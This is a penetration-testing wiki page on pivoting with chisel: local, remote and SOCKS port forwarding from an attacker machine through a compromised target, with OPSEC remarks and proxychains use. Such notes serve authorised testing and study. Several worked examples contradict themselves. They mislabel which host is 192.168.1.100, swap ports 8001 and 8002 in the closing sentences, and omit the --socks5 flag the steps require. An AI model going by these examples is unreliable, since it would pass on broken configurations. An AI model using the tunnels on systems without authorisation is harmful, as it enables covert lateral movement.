# [chisel](https://github.com/jpillora/chisel)

> Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server. Written in Go (golang).

**NO SSH SERVER OR CLIENT REQUIRED.**

---

## Local Port Forwarding

See [[local-port-forwarding]] for a definition and helpful diagrams.

Requires command execution access to the target, as well as the ability to listen on a TCP port on the target. To achieve the same outcome but without having to listen on a TCP port on the target, see [[chisel#Remote Port Forwarding|here]].

1. Download the appropriate binaries of [`chisel`](https://github.com/jpillora/chisel/releases) for both the attacker and the target machine. Transfer a binary to the target machine.

2. Start the `chisel` server on the target's machine:

```bash
./chisel server --port $PORT_TO_SERVE_CHISEL_ON
```

- `$PORT_TO_SERVE_CHISEL_ON` can be any available port on the target. However, keep OPSEC in mind as the attacker will connect to the target on this port.

3. Initiate the port forward from the attacker's machine using the `chisel` client:

```bash
./chisel client $HOSTNAME_OR_ADDRESS_OF_CHISEL_SERVER:$PORT_OF_CHISEL_SERVER $ATTACKER_ACCESSIBLE_SOURCE_PORT:$REMOTE_TARGET_ACCESSIBLE_DESTINATION_HOSTNAME_OR_ADDRESS:$REMOTE_TARGET_ACCESSIBLE_DESTINATION_PORT
```

- `$HOSTNAME_OR_ADDRESS_OF_CHISEL_SERVER`: the hostname or IP address of the target machine, which is the `chisel` server
- `$PORT_OF_CHISEL_SERVER`: self-explanatory
- `$ATTACKER_ACCESSIBLE_SOURCE_PORT`: the source port on the attacker that is forwarded to the destination port
- `$REMOTE_TARGET_ACCESSIBLE_DESTINATION_HOSTNAME_OR_ADDRESS`: the destination hostname/address that is forwarded to
- `$REMOTE_TARGET_ACCESSIBLE_DESTINATION_PORT`: the destination port that is forwarded to

### Example

If you wanted to forward the attacker's `0.0.0.0:8001` to the target's `localhost:8002`, you would start by serving `chisel` on an arbitrary port on the target's machine (we'll use port `8000`). The attacker's IP address is 192.168.1.100.

```bash
./chisel server --port 8000
```

On the attacker machine:

```bash
./chisel client 192.168.1.100:8000 8001:localhost:8002
```

To access the target's `localhost:8001`, connect to the attacker's `0.0.0.0:8002`.

---

## Remote Port Forwarding

See [[remote-port-forwarding]] for a definition and helpful diagrams.

Requires command execution access to the target and doesn't require opening a TCP port on the target.

1. Download the appropriate binaries of [`chisel`](https://github.com/jpillora/chisel/releases) for both the attacker and the target machine. Transfer a binary to the target machine.

2. Start the `chisel` server on the attacker's machine:

```bash
./chisel server --port $PORT_TO_SERVE_CHISEL_ON --reverse
```

- `$PORT_TO_SERVE_CHISEL_ON` can be any available port on the attacker. However, keep OPSEC in mind as the target will connect to the attacker on this port.

3. Initiate the port forward from the target's machine using the `chisel` client:

```bash
./chisel client $HOSTNAME_OR_ADDRESS_OF_CHISEL_SERVER:$PORT_OF_CHISEL_SERVER R:$ATTACKER_ACCESSIBLE_SOURCE_PORT:$REMOTE_TARGET_ACCESSIBLE_DESTINATION_HOSTNAME_OR_ADDRESS:$REMOTE_TARGET_ACCESSIBLE_DESTINATION_PORT
```

- `$HOSTNAME_OR_ADDRESS_OF_CHISEL_SERVER`: the hostname or IP address of the attacker machine, which is the `chisel` server
- `$PORT_OF_CHISEL_SERVER`: self-explanatory
- `$ATTACKER_ACCESSIBLE_SOURCE_PORT`: the source port on the attacker that is forwarded to the destination port
- `$REMOTE_TARGET_ACCESSIBLE_DESTINATION_HOSTNAME_OR_ADDRESS`: the destination hostname/address that is forwarded to
- `$REMOTE_TARGET_ACCESSIBLE_DESTINATION_PORT`: the destination port that is forwarded to

### Example

If you wanted to forward the attacker's `0.0.0.0:8001` to the target's `localhost:8002`, you would start by serving `chisel` on an arbitrary port on the attacker's machine (we'll use port `8000`). The attacker's IP address is 192.168.1.100.

```bash
./chisel server --port 8000 --reverse
```

On the target machine:

```bash
./chisel client 192.168.1.100:8000 R:8001:localhost:8002
```

To access the target's `localhost:8001`, connect to the attacker's `0.0.0.0:8002`.

---

## Dynamic Local Port Forwarding

See [[dynamic-port-forwarding#Dynamic Local Port Forwarding|dynamic local port forwarding]] for a definition and example. This follows the same principles, but uses "attacker" as the client and "target" as the server.

Requires command execution access to the target, as well as the ability to listen on a TCP port on the target. To achieve the same outcome but without having to listen on a TCP port on the target, see [[chisel#Dynamic Remote Port Forwarding|here]].

1. Download the appropriate binaries of [`chisel`](https://github.com/jpillora/chisel/releases) for both the attacker and the target machine. Transfer a binary to the target machine.

2. Start the `chisel` server on the target's machine:

```bash
./chisel server --port $PORT_TO_SERVE_CHISEL_ON --socks5
```

- `$PORT_TO_SERVE_CHISEL_ON` can be any available port on the target. However, keep OPSEC in mind as the attacker will connect to the target on this port.

3. Initiate the port forward from the attacker's machine using the `chisel` client:

```bash
./chisel client $HOSTNAME_OR_ADDRESS_OF_CHISEL_SERVER:$PORT_OF_CHISEL_SERVER $ATTACKER_ACCESSIBLE_SOCKS_PROXY_SOURCE_PORT:socks
```

- `$HOSTNAME_OR_ADDRESS_OF_CHISEL_SERVER`: the hostname or IP address of the target machine, which is the `chisel` server
- `$PORT_OF_CHISEL_SERVER`: self-explanatory
- `$ATTACKER_ACCESSIBLE_SOCKS_PROXY_SOURCE_PORT`: the [[socks]] proxy source port on the attacker that is used when forwarding traffic to the destination port

4. Use [[proxychains]] to pass traffic through this tunnel.

### Example

If you wanted to forward the attacker's `0.0.0.0:1080` through the target to `vm.tgihf.click`:`80` (which is only accessible by the target), you would start by serving `chisel` on an arbitrary port on the target's machine (we'll use port `8000`). Assume the target's IP address is 192.168.1.100.

```bash
./chisel server --port 8000
```

On the attacker machine:

```bash
./chisel client 192.168.1.100:8000 1080:socks
```

To access `vm.tgihf.click`:`80` through the tunnel, first ensure that `192.168.1.100:1080` is defined as the [[socks]] endpoint in the [[proxychains]] config. Then, on the attacker, use [[proxychains]] to make the connection.

```bash
proxychains nc -v vm.tgihf.click 80
```

---

## Dynamic Remote Port Forwarding

See [[dynamic-port-forwarding#Dynamic Remote Port Forwarding|dynamic remote port forwarding]] for a definition and example. This follows the same principles, but uses "target" as the client and "attacker" as the server.

Requires command execution access to the target and doesn't require opening a TCP port on the target.

1. Download the appropriate binaries of [`chisel`](https://github.com/jpillora/chisel/releases) for both the attacker and the target machine. Transfer a binary to the target machine.

2. Start the `chisel` server on the attacker's machine:

```bash
./chisel server --port $PORT_TO_SERVE_CHISEL_ON --reverse
```

- `$PORT_TO_SERVE_CHISEL_ON` can be any available port on the attacker. However, keep OPSEC in mind as the target will connect to the attacker on this port.

3. Initiate the port forward from the target's machine using the `chisel` client:

```bash
./chisel client $HOSTNAME_OR_ADDRESS_OF_CHISEL_SERVER:$PORT_OF_CHISEL_SERVER R:$ATTACKER_ACCESSIBLE_SOCKS_PROXY_SOURCE_PORT:socks
```

- `$HOSTNAME_OR_ADDRESS_OF_CHISEL_SERVER`: the hostname or IP address of the attacker machine, which is the `chisel` server
- `$PORT_OF_CHISEL_SERVER`: self-explanatory
- `$ATTACKER_ACCESSIBLE_SOCKS_PROXY_SOURCE_PORT`: the [[socks]] proxy source port on the attacker that is used when forwarding traffic to the destination port

### Example

If you wanted to forward the attacker's `0.0.0.0:1080` through the target to `vm.tgihf.click`:`80` (which is only accessible by the target), you would start by serving `chisel` on an arbitrary port on the attacker's machine (we'll use port `8000`). The attacker's IP address is 192.168.1.100.

```bash
./chisel server --port 8000 --reverse
```

On the target machine:

```bash
./chisel client 192.168.1.100:8000 R:1080:socks
```

To access `vm.tgihf.click`:`80` through the tunnel, first ensure that `localhost:1080` is defined as the [[socks]] endpoint in the [[proxychains]] config. Then, on the attacker, use [[proxychains]] to make the connection.

```bash
proxychains nc -v vm.tgihf.click 80
```
